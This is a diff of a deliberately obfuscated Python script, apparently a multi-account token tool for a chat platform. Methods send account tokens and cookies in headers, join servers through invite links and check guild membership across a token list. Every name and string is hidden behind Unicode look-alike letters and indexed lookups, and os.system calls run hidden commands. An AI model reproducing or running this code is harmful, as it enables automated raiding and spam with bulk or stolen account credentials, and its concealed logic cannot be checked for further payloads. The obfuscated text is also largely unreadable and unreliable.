𝗜𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝘭𝘭𝘐𝗹𝙡𝙉𝗡𝗜𝙡𝙡𝗠𝙉𝙡𝙉𝗹𝘔𝗜𝙈𝙄𝗠[116]: 36442, 𝙄𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝙄𝘐𝙡𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝘭𝗠𝗡𝗹𝘕𝙡𝗠𝘐𝗠𝙄𝗠[117]: None}
+        𝘱𝙧𝘰𝘱𝙚𝗿𝘁𝗶𝗲𝘀 = 𝘣𝗮𝘀𝗲64.b64encode(𝗷𝘴𝘰𝗻.dumps(𝗽𝗮𝘆𝘭𝘰𝗮𝗱).encode()).decode()
+        return 𝗽𝘳𝙤𝘱𝙚𝙧𝘁𝙞𝗲𝘴
 
     def heders(self, token):
-        return {𝘕𝗠𝘔𝘔𝘕𝘭𝙡𝗠𝙈𝙡𝘔𝗠𝙉𝙡𝘐𝙈𝗜𝘐𝘕𝗠𝙄𝙄𝘔𝙄𝗹𝘐𝗡𝙄𝘔𝘐𝘐𝘔[134]: 𝙉𝗠𝘔𝗠𝗡𝗹𝗹𝙈𝙈𝘭𝗠𝗠𝘕𝗹𝙄𝘔𝙄𝙄𝘕𝙈𝗜𝙄𝙈𝘐𝘭𝘐𝙉𝙄𝗠𝙄𝙄𝙈[143], 𝙉𝙈𝘔𝗠𝘕𝘭𝘭𝘔𝙈𝙡𝘔𝘔𝙉𝗹𝗜𝙈𝘐𝘐𝘕𝙈𝗜𝗜𝙈𝘐𝙡𝙄𝙉𝙄𝘔𝙄𝙄𝙈[135]: 𝘕𝘔𝙈𝘔𝙉𝘭𝙡𝙈𝗠𝘭𝙈𝗠𝗡𝙡𝘐𝗠𝘐𝙄𝗡𝙈𝘐𝘐𝗠𝙄𝗹𝙄𝙉𝙄𝘔𝗜𝘐𝙈[144], 𝗡𝙈𝗠𝙈𝘕𝙡𝗹𝙈𝙈𝘭𝗠𝘔𝗡𝙡𝗜𝘔𝗜𝙄𝘕𝗠𝙄𝘐𝙈𝘐𝙡𝙄𝘕𝘐𝗠𝗜𝘐𝙈[136]: 𝙉𝗠𝙈𝘔𝗡𝗹𝙡𝘔𝙈𝗹𝗠𝗠𝙉𝘭𝗜𝘔𝘐𝘐𝗡𝗠𝗜𝗜𝙈𝙄𝙡𝗜𝗡𝘐𝙈𝙄𝗜𝘔[131], 𝗡𝗠𝗠𝙈𝗡𝗹𝗹𝘔𝘔𝘭𝙈𝘔𝘕𝗹𝗜𝙈𝗜𝙄𝗡𝗠𝗜𝙄𝘔𝙄𝙡𝘐𝙉𝙄𝙈𝙄𝘐𝙈[137]: 𝘁𝗼𝙠𝙚𝘯, 𝘕𝘔𝙈𝗠𝗡𝗹𝙡𝙈𝙈𝗹𝘔𝗠𝘕𝘭𝙄𝗠𝗜𝗜𝗡𝗠𝘐𝙄𝗠𝙄𝙡𝙄𝗡𝘐𝙈𝘐𝙄𝘔[138]: 𝘀𝘦𝗹𝙛.cookies, 𝘕𝗠𝗠𝘔𝗡𝗹𝘭𝗠𝗠𝘭𝘔𝗠𝘕𝗹𝙄𝘔𝗜𝘐𝙉𝙈𝙄𝙄𝙈𝘐𝗹𝘐𝘕𝗜𝘔𝗜𝗜𝗠[139]: 𝘕𝘔𝗠𝙈𝗡𝘭𝘭𝙈𝗠𝙡𝘔𝘔𝙉𝙡𝗜𝗠𝙄𝙄𝗡𝗠𝗜𝘐𝗠𝙄𝘭𝘐𝗡𝗜𝘔𝗜𝗜𝙈[145], 𝘕𝙈𝙈𝗠𝙉𝘭𝗹𝙈𝙈𝗹𝗠𝙈𝘕𝘭𝗜𝙈𝘐𝗜𝙉𝘔𝙄𝙄𝙈𝗜𝘭𝗜𝙉𝘐𝘔𝘐𝙄𝘔[140]: 𝗡𝙈𝘔𝙈𝗡𝗹𝙡𝙈𝘔𝙡𝙈𝙈𝗡𝗹𝘐𝙈𝗜𝗜𝘕𝗠𝘐𝗜𝘔𝘐𝙡𝘐𝘕𝘐𝗠𝙄𝗜𝘔[132], 𝗡𝗠𝘔𝘔𝙉𝘭𝙡𝗠𝙈𝗹𝘔𝗠𝗡𝙡𝙄𝙈𝗜𝙄𝙉𝘔𝙄𝘐𝙈𝙄𝘭𝙄𝙉𝗜𝘔𝙄𝙄𝗠[141]: 𝙉𝘔𝙈𝙈𝗡𝙡𝙡𝙈𝘔𝗹𝘔𝗠𝙉𝗹𝘐𝗠𝘐𝗜𝙉𝘔𝘐𝙄𝗠𝗜𝗹𝗜𝙉𝙄𝗠𝗜𝗜𝘔[146], 𝗡𝗠𝗠𝙈𝗡𝗹𝗹𝙈𝘔𝗹𝗠𝙈𝙉𝙡𝗜𝘔𝘐𝙄𝙉𝗠𝗜𝘐𝗠𝘐𝗹𝙄𝗡𝗜𝗠𝘐𝘐𝗠[142]: 𝘴𝘦𝗹𝘧.props}
+        return {𝘐𝗡𝙄𝙉𝗹𝗹𝙄𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝘭𝗹𝙈𝘕𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝘔[127]: 𝗜𝙉𝙄𝗡𝙡𝙡𝙄𝙈𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝗹𝙡𝗡𝙉𝙄𝘭𝗹𝗠𝘕𝗹𝗡𝘭𝘔𝗜𝗠𝘐𝙈[136], 𝙄𝘕𝙄𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝘭𝗠𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝗡𝗹𝙉𝙡𝗠𝘐𝘔𝗜𝗠[128]: 𝘐𝗡𝙄𝙉𝘭𝙡𝙄𝗠𝙄𝗜𝘭𝘔𝘭𝘭𝗜𝗹𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝙡𝘕𝗹𝘔𝙄𝙈𝗜𝙈[137], 𝙄𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝗜𝙡𝘭𝘕𝗡𝙄𝘭𝗹𝗠𝘕𝘭𝙉𝙡𝙈𝙄𝙈𝘐𝘔[129]: 𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝗡𝘕𝘐𝗹𝗹𝘔𝙉𝘭𝘕𝘭𝗠𝙄𝗠𝗜𝙈[124], 𝗜𝙉𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝙡𝙉𝙉𝘐𝙡𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝗜𝙈𝗜𝙈[130]: 𝘁𝘰𝙠𝘦𝗻, 𝙄𝗡𝗜𝗡𝗹𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝘭𝗜𝘭𝘭𝘕𝙉𝘐𝘭𝗹𝘔𝙉𝙡𝘕𝗹𝘔𝗜𝘔𝙄𝙈[131]: 𝘀𝗲𝙡𝙛.cookies, 𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝙡𝘔𝘭𝘭𝗜𝙡𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝗡𝗹𝘕𝗹𝘔𝙄𝙈𝗜𝙈[132]: 𝙄𝘕𝗜𝗡𝘭𝙡𝘐𝙈𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝘔[138], 𝗜𝙉𝘐𝙉𝗹𝙡𝘐𝙈𝘐𝘐𝙡𝙈𝗹𝗹𝘐𝙡𝗹𝗡𝗡𝘐𝗹𝘭𝘔𝘕𝘭𝗡𝗹𝘔𝙄𝘔𝘐𝙈[133]: 𝗜𝙉𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝘐𝙡𝙈𝗹𝙡𝘐𝗹𝘭𝘕𝗡𝙄𝘭𝙡𝘔𝘕𝙡𝙉𝘭𝙈𝘐𝙈𝘐𝙈[125], 𝙄𝗡𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝘭𝗹𝙉𝘕𝙄𝙡𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝙄𝗠[134]: 𝙄𝙉𝙄𝙉𝙡𝗹𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝗹𝘐𝗹𝗹𝘕𝗡𝗜𝗹𝙡𝙈𝗡𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝘔[139], 𝙄𝗡𝙄𝙉𝘭𝘭𝙄𝘔𝙄𝘐𝙡𝘔𝗹𝙡𝗜𝙡𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝘐𝗠[135]: 𝘀𝗲𝘭𝘧.props}
 
     def joiner(self, token, invite):
-        𝙤𝘀.system(𝙉𝗠𝙈𝙈𝗡𝘭𝙡𝙈𝘔𝗹𝙈𝙈𝗡𝙡𝘐𝙈𝙄𝘐𝘕𝘔𝙄𝗜𝙈𝙄𝘭𝘐𝘕𝘐𝘔𝙄𝗜𝙈[147])
+        𝗼𝘴.system(𝗜𝙉𝘐𝙉𝙡𝙡𝙄𝙈𝘐𝗜𝘭𝘔𝘭𝗹𝘐𝙡𝘭𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝙈[140])
         try:
-            𝗽𝙖𝘺𝙡𝗼𝘢𝗱 = {𝙉𝙈𝙈𝗠𝘕𝘭𝘭𝗠𝙈𝙡𝙈𝗠𝗡𝙡𝘐𝘔𝙄𝙄𝘕𝗠𝙄𝙄𝗠𝘐𝗹𝘐𝙉𝗜𝘔𝗜𝘐𝙈[148]: 𝘶𝘶𝙞𝗱.uuid4().hex}
-            𝗿𝘦𝘴𝙥𝘰𝗻𝙨𝘦 = 𝘀𝗲𝘀𝘴𝘪𝙤𝙣.post(f'{𝙉𝗠𝘔𝙈𝗡𝘭𝘭𝙈𝗠𝗹𝗠𝙈𝙉𝘭𝗜𝗠𝗜𝘐𝘕𝗠𝘐𝙄𝘔𝙄𝙡𝗜𝗡𝘐𝗠𝘐𝘐𝘔[149]}{𝙞𝙣𝙫𝘪𝙩𝘦}', headers=𝙨𝘦𝙡𝗳.heders(𝙩𝙤𝙠𝘦𝙣), json=𝗽𝘢𝘺𝘭𝙤𝗮𝗱)
-            match 𝙧𝗲𝙨𝙥𝙤𝗻𝘴𝘦.status_code:
+            𝘱𝗮𝙮𝘭𝙤𝙖𝘥 = {𝗜𝗡𝘐𝘕𝗹𝙡𝘐𝘔𝘐𝘐𝙡𝗠𝗹𝗹𝗜𝗹𝙡𝗡𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝙄𝗠𝙄𝗠[141]: 𝘂𝙪𝘪𝘥.uuid4().hex}
+            𝘳𝙚𝙨𝘱𝗼𝗻𝙨𝗲 = 𝘴𝘦𝙨𝙨𝗶𝙤𝙣.post(f'{𝘐𝙉𝗜𝗡𝘭𝘭𝙄𝗠𝘐𝘐𝘭𝙈𝘭𝙡𝘐𝙡𝘭𝙉𝗡𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝗜𝙈𝘐𝗠[142]}{𝘪𝗻𝘷𝗶𝘁𝙚}', headers=𝙨𝙚𝘭𝘧.heders(𝘵𝗼𝗸𝘦𝗻), json=𝗽𝗮𝙮𝘭𝗼𝘢𝗱)
+            match 𝘳𝘦𝘴𝙥𝙤𝙣𝘀𝘦.status_code:
                 case 200:
-                    𝙥𝗿𝗶𝘯𝘁(f'{𝘕𝗠𝗠𝘔𝙉𝘭𝙡𝗠𝘔𝙡𝗠𝗠𝙉𝗹𝙄𝙈𝙄𝗜𝙉𝘔𝘐𝙄𝙈𝙄𝗹𝘐𝘕𝙄𝗠𝘐𝙄𝗠[98]}{𝙡𝗰}{𝘕𝙈𝘔𝙈𝙉𝗹𝙡𝙈𝘔𝗹𝙈𝗠𝘕𝗹𝘐𝘔𝘐𝗜𝗡𝗠𝗜𝘐𝘔𝘐𝗹𝙄𝘕𝘐𝙈𝘐𝗜𝗠[150]}{𝗿}{𝘕𝘔𝗠𝗠𝙉𝗹𝗹𝘔𝙈𝘭𝘔𝙈𝗡𝘭𝘐𝙈𝘐𝘐𝘕𝗠𝘐𝘐𝘔𝙄𝙡𝙄𝘕𝗜𝘔𝗜𝘐𝘔[106]}{𝘵𝙤𝗸𝙚𝗻[:25]}{𝗡𝗠𝙈𝙈𝘕𝗹𝗹𝘔𝗠𝙡𝘔𝘔𝘕𝗹𝗜𝘔𝘐𝘐𝘕𝘔𝘐𝘐𝘔𝗜𝘭𝘐𝙉𝙄𝗠𝙄𝗜𝗠[151]}{𝗶𝙣𝘷𝗶𝘵𝗲}{𝘕𝘔𝙈𝙈𝘕𝗹𝘭𝗠𝗠𝘭𝙈𝘔𝘕𝘭𝗜𝙈𝙄𝘐𝘕𝘔𝘐𝘐𝗠𝙄𝘭𝙄𝗡𝘐𝙈𝙄𝗜𝗠[102]}')
+                    𝙥𝗿𝗶𝗻𝘵(f'{𝗜𝘕𝗜𝗡𝘭𝗹𝙄𝗠𝙄𝙄𝗹𝙈𝗹𝗹𝗜𝙡𝙡𝗡𝗡𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝗠𝗜𝗠[91]}{𝙡𝗰}{𝙄𝙉𝙄𝘕𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝘭𝘕𝘕𝙄𝘭𝙡𝗠𝗡𝗹𝙉𝘭𝗠𝗜𝙈𝙄𝗠[143]}{𝘳}{𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝘔𝘐𝙄𝙡𝘔𝗹𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝙉𝘭𝘕𝙡𝘔𝙄𝙈𝙄𝙈[99]}{𝘁𝗼𝙠𝗲𝙣[:25]}{𝙄𝘕𝘐𝙉𝙡𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝗹𝘭𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝗹𝗠𝘕𝘭𝙉𝙡𝙈𝗜𝗠𝘐𝙈[144]}{𝙞𝙣𝙫𝗶𝘁𝘦}{𝘐𝘕𝘐𝗡𝗹𝗹𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝙡𝗡𝙉𝗜𝙡𝘭𝗠𝘕𝘭𝙉𝙡𝙈𝘐𝘔𝗜𝗠[95]}')
                 case 400:
-                    𝙥𝘳𝘪𝘯𝘵(f'{𝙉𝘔𝗠𝘔𝗡𝘭𝗹𝙈𝘔𝗹𝙈𝗠𝙉𝘭𝘐𝘔𝗜𝘐𝗡𝗠𝙄𝙄𝗠𝗜𝗹𝙄𝙉𝙄𝘔𝗜𝗜𝙈[98]}{𝘭𝘤}{𝙉𝘔𝗠𝗠𝗡𝙡𝗹𝙈𝘔𝘭𝗠𝙈𝙉𝘭𝗜𝙈𝙄𝙄𝙉𝙈𝙄𝘐𝙈𝗜𝘭𝗜𝘕𝙄𝗠𝗜𝘐𝙈[152]}{𝗿}{𝘕𝙈𝘔𝘔𝘕𝗹𝗹𝘔𝗠𝘭𝙈𝘔𝘕𝗹𝙄𝘔𝙄𝗜𝘕𝙈𝙄𝗜𝙈𝙄𝗹𝗜𝘕𝗜𝙈𝘐𝙄𝘔[106]}{𝙩𝙤𝗸𝗲𝗻[:25]}{𝘕𝗠𝗠𝙈𝗡𝗹𝘭𝗠𝙈𝗹𝙈𝘔𝙉𝙡𝙄𝗠𝗜𝙄𝗡𝗠𝗜𝙄𝙈𝘐𝘭𝘐𝘕𝗜𝘔𝘐𝘐𝘔[151]}{𝗶𝗻𝘷𝙞𝘁𝙚}{𝘕𝗠𝗠𝘔𝘕𝗹𝗹𝗠𝙈𝗹𝗠𝙈𝙉𝙡𝘐𝗠𝗜𝘐𝘕𝘔𝗜𝘐𝗠𝗜𝗹𝙄𝘕𝘐𝗠𝙄𝗜𝙈[102]}')
+                    𝙥𝘳𝘪𝗻𝘵(f'{𝗜𝗡𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝙉𝗹𝗠𝘐𝗠𝘐𝙈[91]}{𝙡𝗰}{𝘐𝘕𝘐𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝙡𝙈𝘐𝙈𝘐𝘔[145]}{𝘳}{𝗜𝙉𝘐𝘕𝘭𝙡𝘐𝗠𝘐𝗜𝙡𝙈𝘭𝗹𝘐𝙡𝙡𝘕𝙉𝗜𝙡𝙡𝙈𝘕𝗹𝗡𝘭𝙈𝙄𝗠𝘐𝗠[99]}{𝘁𝙤𝘬𝙚𝗻[:25]}{𝘐𝗡𝘐𝙉𝘭𝙡𝙄𝘔𝙄𝗜𝙡𝘔𝘭𝘭𝘐𝗹𝗹𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝘭𝘕𝙡𝙈𝗜𝗠𝘐𝙈[144]}{𝗶𝙣𝙫𝗶𝙩𝗲}{𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝗠𝗜𝘐𝘭𝘔𝗹𝙡𝗜𝗹𝘭𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝘔𝙄𝘔𝙄𝙈[95]}')
                 case 429:
-                    𝙥𝗿𝗶𝗻𝘵(f'{𝗡𝙈𝗠𝘔𝗡𝙡𝗹𝙈𝗠𝘭𝗠𝙈𝗡𝙡𝘐𝘔𝗜𝗜𝙉𝘔𝘐𝘐𝙈𝙄𝙡𝗜𝗡𝗜𝙈𝗜𝗜𝘔[98]}{𝘭𝙘}{𝗡𝗠𝗠𝙈𝙉𝙡𝙡𝘔𝙈𝗹𝙈𝘔𝗡𝗹𝗜𝗠𝗜𝗜𝗡𝘔𝗜𝗜𝗠𝙄𝘭𝗜𝘕𝗜𝗠𝙄𝙄𝗠[153]}{𝗿}{𝘕𝘔𝗠𝘔𝘕𝘭𝗹𝗠𝙈𝙡𝙈𝗠𝘕𝘭𝘐𝗠𝙄𝘐𝘕𝙈𝙄𝘐𝗠𝙄𝗹𝘐𝗡𝙄𝘔𝙄𝙄𝗠[106]}{𝙩𝗼𝘬𝘦𝘯[:25]}{𝘕𝗠𝙈𝘔𝙉𝘭𝘭𝗠𝙈𝗹𝘔𝘔𝗡𝗹𝘐𝘔𝙄𝘐𝘕𝘔𝙄𝗜𝙈𝙄𝘭𝙄𝙉𝘐𝘔𝘐𝙄𝘔[151]}{𝙞𝙣𝘃𝙞𝘁𝘦}{𝙉𝘔𝘔𝗠𝘕𝗹𝙡𝘔𝘔𝙡𝗠𝙈𝙉𝘭𝙄𝘔𝗜𝙄𝗡𝙈𝗜𝙄𝘔𝘐𝘭𝘐𝘕𝘐𝙈𝗜𝗜𝗠[102]}')
+                    𝘱𝙧𝗶𝗻𝘁(f'{𝙄𝙉𝘐𝘕𝘭𝙡𝘐𝗠𝘐𝙄𝘭𝘔𝙡𝗹𝙄𝗹𝘭𝗡𝙉𝘐𝗹𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝙈𝘐𝙈[91]}{𝘭𝙘}{𝘐𝘕𝙄𝘕𝘭𝘭𝙄𝗠𝗜𝙄𝗹𝗠𝘭𝘭𝙄𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝗠𝗡𝘭𝘕𝗹𝘔𝙄𝘔𝗜𝙈[146]}{𝙧}{𝙄𝙉𝗜𝗡𝙡𝗹𝘐𝗠𝙄𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝙡𝗡𝙉𝙄𝘭𝙡𝘔𝘕𝙡𝘕𝙡𝘔𝘐𝙈𝘐𝙈[99]}{𝙩𝘰𝘬𝘦𝘯[:25]}{𝘐𝗡𝘐𝗡𝙡𝘭𝗜𝗠𝗜𝗜𝗹𝙈𝘭𝘭𝙄𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝙉𝗹𝘕𝗹𝗠𝗜𝙈𝙄𝗠[144]}{𝙞𝗻𝘃𝙞𝘵𝙚}{𝘐𝗡𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝗹𝘭𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝙉𝙡𝘕𝘭𝗠𝙄𝙈𝙄𝗠[95]}')
                 case _:
-                    𝗽𝘳𝘪𝙣𝘵(f'{𝗡𝘔𝙈𝘔𝙉𝘭𝗹𝗠𝗠𝘭𝙈𝗠𝘕𝗹𝗜𝘔𝗜𝗜𝙉𝘔𝙄𝗜𝗠𝘐𝗹𝗜𝙉𝗜𝗠𝘐𝙄𝘔[98]}{𝙡𝙘}{𝗡𝘔𝗠𝙈𝗡𝗹𝗹𝗠𝘔𝙡𝙈𝗠𝘕𝘭𝙄𝘔𝙄𝗜𝙉𝙈𝙄𝘐𝘔𝗜𝗹𝘐𝘕𝙄𝙈𝙄𝗜𝙈[154]}{𝘳}{𝘕𝙈𝙈𝘔𝙉𝘭𝗹𝗠𝙈𝗹𝗠𝙈𝙉𝘭𝘐𝘔𝙄𝗜𝗡𝙈𝘐𝗜𝙈𝘐𝗹𝗜𝙉𝗜𝗠𝗜𝙄𝙈[106]}{𝙩𝙤𝙠𝙚𝘯[:25]}{𝗡𝙈𝘔𝘔𝘕𝘭𝙡𝗠𝗠𝘭𝗠𝘔𝘕𝘭𝙄𝘔𝘐𝙄𝘕𝙈𝗜𝗜𝙈𝘐𝙡𝙄𝘕𝙄𝘔𝗜𝙄𝗠[101]}{𝘳𝘦𝘀𝘱𝘰𝙣𝘴𝗲.json()[𝙉𝙈𝗠𝗠𝙉𝙡𝗹𝗠𝙈𝗹𝗠𝘔𝗡𝘭𝙄𝙈𝗜𝙄𝘕𝙈𝗜𝙄𝗠𝗜𝗹𝘐𝗡𝙄𝙈𝙄𝗜𝘔[155]]}{𝗡𝙈𝘔𝙈𝘕𝗹𝙡𝗠𝗠𝙡𝙈𝙈𝗡𝘭𝙄𝘔𝙄𝗜𝘕𝙈𝙄𝗜𝙈𝙄𝘭𝙄𝗡𝙄𝘔𝗜𝗜𝙈[102]}')
-        except 𝘌𝘹𝘤𝙚𝙥𝘵𝙞𝗼𝗻 as e:
-            𝘱𝙧𝗶𝗻𝙩(f'{𝘕𝗠𝘔𝙈𝘕𝗹𝘭𝙈𝗠𝙡𝙈𝗠𝗡𝙡𝘐𝗠𝗜𝙄𝗡𝗠𝗜𝙄𝙈𝙄𝘭𝙄𝗡𝘐𝗠𝘐𝗜𝗠[98]}{𝗹𝗰}{𝘕𝗠𝗠𝗠𝗡𝘭𝘭𝗠𝘔𝗹𝙈𝙈𝗡𝙡𝙄𝙈𝙄𝘐𝙉𝗠𝙄𝘐𝙈𝗜𝙡𝗜𝗡𝗜𝘔𝗜𝘐𝙈[156]}{𝗿}{𝗡𝙈𝗠𝗠𝙉𝙡𝙡𝙈𝘔𝙡𝙈𝗠𝙉𝗹𝘐𝘔𝙄𝙄𝗡𝘔𝙄𝘐𝗠𝘐𝘭𝙄𝙉𝗜𝗠𝘐𝘐𝙈[106]}{𝙚}{𝗡𝙈𝙈𝗠𝙉𝙡𝗹𝗠𝘔𝙡𝙈𝗠𝙉𝘭𝙄𝘔𝙄𝘐𝗡𝙈𝗜𝗜𝘔𝙄𝘭𝗜𝙉𝘐𝗠𝙄𝗜𝙈[157]}')
+                    𝘱𝗿𝙞𝘯𝘁(f'{𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝗜𝘭𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝘕𝙡𝙉𝘭𝙈𝗜𝗠𝙄𝙈[91]}{𝗹𝗰}{𝙄𝗡𝘐𝗡𝘭𝘭𝙄𝙈𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝗹𝙡𝘕𝙉𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝘭𝗠𝙄𝙈𝗜𝘔[147]}{𝙧}{𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝘔𝗹𝙡𝘐𝗹𝘭𝙉𝘕𝘐𝗹𝗹𝘔𝗡𝗹𝘕𝙡𝗠𝗜𝗠𝘐𝙈[99]}{𝘵𝗼𝙠𝘦𝘯[:25]}{𝘐𝘕𝘐𝗡𝘭𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝘭𝙡𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝘔[94]}{𝗿𝘦𝘀𝗽𝘰𝗻𝘀𝘦.json()[𝙄𝘕𝘐𝗡𝙡𝗹𝙄𝘔𝙄𝙄𝘭𝗠𝗹𝘭𝘐𝗹𝗹𝙉𝘕𝙄𝙡𝙡𝙈𝙉𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝗠[148]]}{𝗜𝙉𝗜𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝙈𝗡𝙡𝗡𝗹𝘔𝘐𝙈𝗜𝗠[95]}')
+        except 𝙀𝘅𝙘𝘦𝙥𝘵𝘪𝗼𝘯 as e:
+            𝘱𝗿𝙞𝘯𝘵(f'{𝙄𝘕𝙄𝙉𝘭𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝗹𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝙉𝗹𝘕𝘭𝗠𝗜𝘔𝗜𝙈[91]}{𝗹𝗰}{𝗜𝘕𝙄𝘕𝙡𝙡𝙄𝘔𝗜𝗜𝗹𝗠𝘭𝗹𝘐𝙡𝙡𝗡𝗡𝙄𝙡𝙡𝗠𝗡𝙡𝗡𝗹𝗠𝙄𝘔𝗜𝗠[149]}{𝙧}{𝙄𝘕𝗜𝗡𝘭𝗹𝘐𝗠𝘐𝗜𝙡𝘔𝘭𝗹𝗜𝗹𝘭𝘕𝗡𝙄𝗹𝘭𝘔𝗡𝘭𝙉𝘭𝗠𝗜𝙈𝗜𝙈[99]}{𝙚}{𝗜𝙉𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝙡𝘐𝗹𝗹𝙉𝘕𝗜𝘭𝗹𝘔𝗡𝗹𝙉𝘭𝗠𝙄𝙈𝙄𝙈[150]}')
 
     def leaver(self, token, guild):
-        𝗼𝘴.system(𝙉𝘔𝙈𝙈𝙉𝗹𝙡𝙈𝙈𝘭𝘔𝘔𝗡𝙡𝘐𝗠𝘐𝘐𝘕𝘔𝗜𝙄𝙈𝘐𝘭𝘐𝗡𝗜𝗠𝗜𝗜𝙈[158])
+        𝗼𝘀.system(𝙄𝙉𝘐𝙉𝘭𝙡𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝘭𝗹𝗡𝘕𝘐𝘭𝙡𝗠𝘕𝘭𝘕𝙡𝙈𝗜𝘔𝙄𝘔[151])
         try:
 
             def get_guild_name(guild):
-                𝘪𝙣_𝙜𝘶𝗶𝘭𝗱 = []
-                for 𝙩𝙤𝗸𝘦𝙣 in 𝘵𝘰𝘬𝘦𝙣𝘀:
-                    𝘳𝗲𝙨𝙥𝙤𝗻𝘀𝗲 = 𝘀𝗲𝘀𝘀𝘪𝗼𝗻.get(f'{𝙉𝙈𝙈𝙈𝙉𝙡𝙡𝙈𝘔𝘭𝗠𝘔𝘕𝙡𝙄𝘔𝘐𝘐𝘕𝙈𝗜𝙄𝘔𝘐𝗹𝙄𝙉𝘐𝘔𝗜𝗜𝗠[159]}{𝘨𝙪𝘪𝘭𝘥}', headers=𝘀𝗲𝘭𝙛.headers(𝘁𝙤𝙠𝗲𝙣))
-                    match 𝘳𝗲𝙨𝗽𝙤𝗻𝘴𝗲.status_code:
+                𝗶𝘯_𝙜𝘶𝗶𝙡𝘥 = []
+                for 𝘵𝘰𝘬𝙚𝘯 in 𝙩𝘰𝗸𝗲𝘯𝘴:
+                    𝙧𝘦𝘀𝗽𝙤𝘯𝙨𝙚 = 𝘴𝗲𝘀𝘴𝘪𝗼𝙣.get(f'{𝙄𝗡𝘐𝘕𝙡𝙡𝙄𝘔𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝗡𝘕𝘐𝘭𝘭𝘔𝙉𝙡𝗡𝙡𝘔𝗜𝘔𝙄𝗠[152]}{𝗴𝙪𝘪𝗹𝗱}', headers=𝘴𝙚𝘭𝗳.headers(𝙩𝗼𝘬𝙚𝗻))
+                    match 𝙧𝘦𝙨𝙥𝗼𝘯𝘴𝙚.status_code:
                         case 200:
-                            𝘪𝘯_𝙜𝙪𝘪𝘭𝘥.append(𝙩𝙤𝘬𝘦𝙣)
+                            𝗶𝙣_𝘨𝘂𝘪𝗹𝘥.append(𝙩𝘰𝘬𝙚𝙣)
                             try:
